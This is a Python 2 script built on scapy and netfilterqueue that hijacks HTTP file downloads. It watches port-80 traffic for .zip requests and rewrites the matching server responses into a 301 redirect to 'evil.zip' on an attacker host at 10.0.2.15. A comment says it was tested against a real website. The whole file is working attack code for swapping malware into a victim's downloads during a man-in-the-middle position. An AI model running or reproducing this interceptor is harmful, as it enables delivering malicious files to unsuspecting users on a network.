#! /usr/bin/env python
# WARNING: Not compatible with Python 3.x

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".zip" in scapy_packet[scapy.Raw].load:
                # Tested on unsecured website: chomikuj.pl
                print("[+] Download ZIP Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Could be converted to walrus assignment in 3.8.
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/downloads/evil.zip\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


print("Queue has been created.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
